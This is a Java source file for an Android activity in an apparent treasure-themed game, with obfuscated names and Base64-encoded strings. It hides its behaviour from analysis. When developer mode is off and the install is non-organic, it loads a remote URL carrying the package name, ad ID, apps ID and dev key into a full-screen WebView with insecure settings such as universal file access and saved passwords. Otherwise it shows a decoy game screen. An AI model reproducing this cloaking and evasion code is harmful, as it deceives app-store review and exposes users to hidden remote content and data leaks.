package com.wiilld.weesst.tttreasure;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.Display;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.constraintlayout.widget.ConstraintLayout;


public class WWT extends Activity {
    public static ValueCallback<Uri> oijsa;
    public static Uri ytshakj = null;
    public static ValueCallback<Uri[]> qwewqw;
    public static String vgsjaiu;
    public static final int oijnnsa = 1;
    ConstraintLayout consrtLa;
    Button buttonSt, buttonPol, buttonFins;
    ProgressBar ijna;
    Display iuhbsxa;
    WebView oijjjj;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.wwt);
        getWindow().addFlags(1024);
        oijjjj = findViewById(R.id.uldls);
        consrtLa = findViewById(R.id.consrtLa);
        ijna = findViewById(R.id.bar);
        Butt.progressBar = ijna;
        dis();
        Butt.bddsk();
        int bo = 0;
        int ddd = Settings.Secure.getInt(this.getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0);
        if (ddd == bo){

            new Thread(new Runnable() {
                @RequiresApi(api = Build.VERSION_CODES.O)
                @Override
                public void run() {
                    try {
                        Dat dat = A.coco();
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {

                                MainActivity.hdsk(dat,WWT.this);

                               String savedLink = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(A.dds("c2F2ZWRVcmw="), "wwwwww");

                                if (savedLink.equals("wwwwww")){
                                    new Handler().postDelayed(new Runnable() {
                                        @Override
                                        public void run() {

                                            String yr = A.ihbjaq;
                                            String po = null;
                                            if (yr.equals(A.dds("Tm9uLW9yZ2FuaWM="))){
                                                po = dat.getKsxa() + A.ihwq;
                                                oijjjj.setVisibility(View.VISIBLE);
                                                oijjjj.loadUrl(po);
                                            }else if(MainActivity.oiuhs != null) {
                                                po = dat.getKsxa()  + MainActivity.oijjnw;
                                                oijjjj.setVisibility(View.VISIBLE);
                                                oijjjj.loadUrl(po);
                                            }else {
                                                if (dat.getIhjas().equals(A.dds("Tk8="))) {
                                                    Butt.bdjj();
                                                    Butt.jfld();
                                                }else {
                                                    String tre = dat.getIhjas() + A.dds("P2J1bmRsZT0=") + getPackageName() + A.dds("JmFkX2lkPQ==") + A.ihdaq
                                                            + A.dds("JmFwcHNfaWQ9") + A.iubds + A.dds("JmRldl9rZXk9") + A.dds(A.ihda);
                                                    oijjjj.setVisibility(View.VISIBLE);
                                                    po = dat.getKsxa()  + tre;
                                                    oijjjj.loadUrl(po);
                                                }
                                            }
                                        }
                                    },5000);

                                }else {
                                    oijjjj.setVisibility(View.VISIBLE);
                                    oijjjj.loadUrl(savedLink);
                                }
                            }
                        });
                }catch (Exception e){

                        Butt.bdjj();
                        Butt.jfld();
                    }
                }
            }).start();


        }else {
            Butt.bdjj();
            Butt.jfld();
        }


        CookieManager.getInstance().setAcceptThirdPartyCookies(oijjjj, true);
        CookieManager.getInstance().setAcceptCookie(true);
        oijjjj.getSettings().setAllowFileAccessFromFileURLs(true);
        oijjjj.getSettings().setSavePassword(true);
        oijjjj.getSettings().setDatabaseEnabled(true);
        oijjjj.getSettings().setRenderPriority(android.webkit.WebSettings.RenderPriority.HIGH);
        oijjjj.getSettings().setCacheMode(android.webkit.WebSettings.LOAD_DEFAULT);
        oijjjj.getSettings().setAppCacheEnabled(true);
        oijjjj.getSettings().setLoadsImagesAutomatically(true);
        oijjjj.setSaveEnabled(true);
        oijjjj.getSettings().setMixedContentMode(0);
        oijjjj.setFocusable(true);
        oijjjj.getSettings().setAllowUniversalAccessFromFileURLs(true);
        oijjjj.getSettings().setJavaScriptEnabled(true);
        oijjjj.getSettings().setAllowContentAccess(true);
        oijjjj.getSettings().setLoadWithOverviewMode(true);
        oijjjj.getSettings().setEnableSmoothTransition(true);
        oijjjj.getSettings().setUseWideViewPort(true);
        oijjjj.getSettings().setSaveFormData(true);
        oijjjj.getSettings().setAllowFileAccess(true);
        oijjjj.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        oijjjj.getSettings().setDomStorageEnabled(true);
        oijjjj.setFocusableInTouchMode(true);
        oijjjj.setWebViewClient(new WebClientoiiuhn(this));
        oijjjj.setWebChromeClient(new WebChromeoksjda(this));


    }

    @Override
    public void onBackPressed() {
        if (oijjjj.isFocused() && oijjjj.canGoBack()) {
            oijjjj.goBack();
        }
    }

    public void dis(){
        iuhbsxa =  getWindowManager().getDefaultDisplay();
        int w = iuhbsxa.getWidth();
        int h = iuhbsxa.getHeight();
        Butt butt = new Butt(consrtLa,buttonSt,buttonPol,buttonFins,w,h,this);
        butt.butt();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode != oijnnsa || qwewqw == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri[] results = null;
        if (resultCode == Activity.RESULT_OK) {
            if (data == null) {
                if (vgsjaiu != null) {
                    results = new Uri[]{Uri.parse(vgsjaiu)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    results = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        qwewqw.onReceiveValue(results);
        qwewqw = null;
        if (oijsa == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri result = null;
        try {
            if (resultCode != RESULT_OK) {
                result = null;
            } else {
                result = data == null ? ytshakj : data.getData();
            }
        } catch (Exception e) { }
        oijsa.onReceiveValue(result);
        oijsa = null;
    }
}
